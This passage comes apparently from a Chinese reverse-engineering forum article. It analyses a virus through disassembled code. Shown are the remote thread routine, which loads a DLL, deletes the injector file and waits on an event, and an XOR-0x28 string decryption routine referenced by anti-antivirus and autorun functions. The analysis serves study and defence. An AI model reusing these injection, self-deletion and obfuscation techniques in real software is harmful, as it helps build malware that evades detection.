
```asm
004013DE                 mov     esi, [ebp+arg_0]

004013E1                 push    edi

004013E2                 lea     eax, [esi+18h]  ; LibPathName

004013E5                 push    eax

004013E6                 call    dword ptr [esi] ; 加载LibPathName所指DLL

004013E8                 and     byte ptr [ebp+arg_0+3], 0

004013EC                 mov     edi, eax

004013EE                 mov     eax, [edi+30h]

004013F1                 mov     ecx, [edi+34h]

004013F4                 test    eax, eax

004013F6                 mov     [ebp+var_4], ecx

004013F9                 jz      short loc_401447

004013F9

004013FB                 push    ebx

004013FC                 call    eax             ; 调用Dll中的函数(未导出)

004013FE                 lea     ebx, [esi+11Ch] ; ModuleFileName

004013FE

00401404

00401404                 cmp     byte ptr [ebx], 0

00401407                 jz      short loc_401419 ;

00401407

00401409                 cmp     byte ptr [ebp+arg_0+3], 0

0040140D                 jnz     short loc_401419 ; "51343281"

0040140D

0040140F                 push    ebx

00401410                 call    dword ptr [esi+4] ; DeleteFileA 删除注入器病毒程序

00401413                 test    eax, eax

00401415                 setnz   byte ptr [ebp+arg_0+3] ; 删除标记，重复利用输入参数

00401415

00401419

00401419                 lea     eax, [esi+220h] ; "51343281"

0040141F                 push    eax

00401420                 push    0

00401422                 push    1F0003h

00401427                 call    dword ptr [esi+8] ; OpenEventA

0040142A                 test    eax, eax

0040142C                 jnz     short loc_401435 ; 直到有新的病毒实例创建事件，否则该线程处理函数一直处于循环等待状态

0040142E                 push    64h

00401430                 call    dword ptr [esi+0Ch] ; Sleep 100ms

00401433                 jmp     short loc_401404

00401433

00401435 ; ---------------------------------------------------------------------------

00401435                 push    eax

00401436                 call    dword ptr [esi+10h] ; CloseHandle Event

00401439                 call    [ebp+var_4]     ; 调用 Dll+0x34 处所指向的函数

0040143C                 push    edi

0040143D                 call    dword ptr [esi+14h] ; FreeLibrary Dll

00401440                 push    edi

00401441                 call    dword ptr [esi+10h] ; CloseHandle hDllModule

00401444                 xor     eax, eax

00401446                 pop     ebx

00401446

00401447                 pop     edi

00401448                 pop     esi

00401449                 leave

0040144A

0040144A locret_40144A:

0040144A                 retn    4

0040144A

0040144A RemoteThreadProc endp
```

## 五、 病毒程序中的解密程序：

病毒中保存的许多敏感的字符中都是经过加密(其实就是与`0x28`异或)存储的，病毒在使用的时候，都是先解密然后再使用的。

```asm
00401979 Decrypt         proc near               ; CODE XREF: SetAutoRun+2B p
00401979                                         ; AntiAV+11 p AntiAV+1D p
00401979                                         ; AntiAV+29 p

00401979

00401979 arg_0           = dword ptr  8
00401979 arg_4           = dword ptr  0Ch

00401979                 push    ebp
0040197A                 mov     ebp, esp
0040197C                 nop
0040197D                 xor     ecx, ecx
0040197F                 cmp     [ebp+arg_4], ecx
00401982                 jle     short loc_401992
00401982

00401984

00401984 loc_401984:                             ; CODE XREF: Decrypt+17 j
00401984                 mov     eax, [ebp+arg_0]
00401987                 add     eax, ecx
00401989                 xor     byte ptr [eax], 28h
0040198C                 inc     ecx
0040198D                 cmp     ecx, [ebp+arg_4]
00401990                 jl      short loc_401984
00401990

00401992

00401992 loc_401992:                             ; CODE XREF: Decrypt+9 j
00401992                 pop     ebp
00401993                 retn
00401993

00401993 Decrypt         endp
```

--------------------------------------------------------------------------------

【版权声明】: 本文原创于看雪技术论坛, 转载请注明作者并保持文章的完整, 谢谢!

2008年02月26日 17:15:03

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
